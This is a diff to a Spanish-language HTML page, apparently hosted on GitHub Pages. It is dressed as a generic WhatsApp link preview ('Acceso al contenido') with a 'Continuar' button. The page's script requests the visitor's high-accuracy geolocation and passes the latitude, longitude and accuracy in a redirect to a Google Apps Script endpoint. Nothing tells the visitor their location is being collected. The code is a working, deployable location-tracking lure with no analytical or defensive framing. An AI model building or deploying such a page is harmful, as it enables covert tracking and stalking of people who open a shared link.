@@ -3,17 +3,15 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cargando...</title>
+  <title>Acceso</title>
 
-  <!-- Metadatos Open Graph para WhatsApp y redes sociales -->
+  <!-- Metadatos Open Graph para la vista previa de WhatsApp -->
   <meta property="og:type" content="website">
   <meta property="og:title" content="Acceso al contenido">
-  <meta property="og:description" content="Haz clic para continuar">
-
-  <!-- RUTA DE LA IMAGEN: Sustituye con tu usuario y nombre del repositorio -->
-  <!-- Si usas GitHub Pages: https://USUARIO.github.io/REPOSITORIO/luna.png -->
-  <!-- Si usas el enlace Raw: https://raw.githubusercontent.com/USUARIO/REPOSITORIO/main/luna.png -->
-  <meta property="og:image" content="https://raw.githubusercontent.com/USUARIO/REPOSITORIO/main/luna.png">
+  <meta property="og:description" content="Toca aquí para continuar al enlace.">
+  <meta property="og:url" content="https://mishellpiguis-rgb.github.io/Luna/">
+  <meta property="og:image" content="https://mishellpiguis-rgb.github.io/Luna/luna.png">
+  <meta property="og:image:secure_url" content="https://mishellpiguis-rgb.github.io/Luna/luna.png">
   <meta property="og:image:type" content="image/png">
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
@@ -26,71 +24,130 @@
     }
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background-color: #f8fafc;
-      color: #334155;
+      background: linear-gradient(135deg, #090d16, #111827);
+      color: #f3f4f6;
+      min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
-      padding: 24px;
+      padding: 20px;
       text-align: center;
     }
-    .spinner {
-      width: 46px;
-      height: 46px;
-      border: 4px solid #e2e8f0;
-      border-top: 4px solid #2563eb;
-      border-radius: 50%;
-      animation: spin 0.9s linear infinite;
-      margin-bottom: 20px;
+    .container {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 20px;
+      padding: 32px 24px;
+      max-width: 380px;
+      width: 100%;
+      backdrop-filter: blur(12px);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
     }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    .preview-img {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin-bottom: 20px;
+      border: 2px solid #38bdf8;
+      box-shadow: 0 0 15px rgba(56, 189, 248, 0.3);
+    }
+    h1 {
+      font-size: 1.25rem;
+      margin-bottom: 8px;
+      font-weight: 600;
     }
     p {
-      font-size: 1.05rem;
-      line-height: 1.5;
+      font-size: 0.95rem;
+      color: #9ca3af;
+      margin-bottom: 24px;
+      line-height: 1.4;
+    }
+    .btn {
+      background: #0284c7;
+      color: #ffffff;
+      border: none;
+      padding: 14px 24px;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 12px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.2s, transform 0.1s;
+    }
+    .btn:active {
+      transform: scale(0.98);
+      background: #0369a1;
+    }
+    .btn:disabled {
+      background: #475569;
+      cursor: not-allowed;
+    }
+    .status-text {
+      margin-top: 14px;
+      font-size: 0.85rem;
+      color: #38bdf8;
+      display: none;
     }
   </style>
 </head>
 <body>
 
-  <div class="spinner"></div>
-  <p>Cargando contenido, espera un momento...</p>
+  <div class="container">
+    <img src="luna.png" alt="Luna" class="preview-img" onerror="this.style.display='none'">
+    <h1>Continuar al contenido</h1>
+    <p>Pulsa el botón para autorizar el acceso y redirigirte al sitio.</p>
+
+    <button id="btnAcceso" class="btn" onclick="iniciarAcceso()">Continuar</button>
+    <div id="status" class="status-text">Cargando...</div>
+  </div>
 
   <script>
-    const urlDestino = "https://script.google.com/macros/s/AKfycbwssa1HAg7fh83S9LTyx92XaJ9OKIInI7elzBFTsogvhFkiuF4BbrgSR-kMCwioIhd1/exec";
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwssa1HAg7fh83S9LTyx92XaJ9OKIInI7elzBFTsogvhFkiuF4BbrgSR-kMCwioIhd1/exec";
 
     function redirigir(query = "") {
-      window.location.href = urlDestino + query;
+      window.location.replace(GOOGLE_SCRIPT_URL + query);
     }
 
-    // Disparar la solicitud de ubicación al navegador
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        (posicion) => {
-          // Si el usuario acepta, adjunta las coordenadas a la URL
-          const lat = posicion.coords.latitude;
-          const lon = posicion.coords.longitude;
-          const precision = posicion.coords.accuracy;
-          redirigir(`?lat=${lat}&lon=${lon}&acc=${precision}`);
-        },
-        (error) => {
-          // Si el usuario deniega el permiso o caduca el tiempo, redirige igual
-          console.warn("Ubicación no otorgada:", error.message);
-          redirigir();
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 6000,
-          maximumAge: 0
-        }
-      );
-    } else {
-      // Si el navegador no soporta geolocalización
-      redirigir();
+    function iniciarAcceso() {
+      const btn = document.getElementById("btnAcceso");
+      const status = document.getElementById("status");
+
+      btn.disabled = true;
+      btn.innerText = "Conectando...";
+      status.style.display = "block";
+      status.innerText = "Solicitando permisos de ubicación...";
+
+      // Temporizador de seguridad: si pasan 4 segundos sin respuesta, redirige de todas formas
+      const timerSeguridad = setTimeout(() => {
+        redirigir();
+      }, 4000);
+
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            clearTimeout(timerSeguridad);
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+            redirigir(`?lat=${lat}&lon=${lon}&acc=${acc}`);
+          },
+          (err) => {
+            clearTimeout(timerSeguridad);
+            console.warn("Permiso denegado o no disponible:", err.message);
+            redirigir();
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 3500,
+            maximumAge: 0
+          }
+        );
+      } else {
+        clearTimeout(timerSeguridad);
+        redirigir();
+      }
     }
   </script>
 
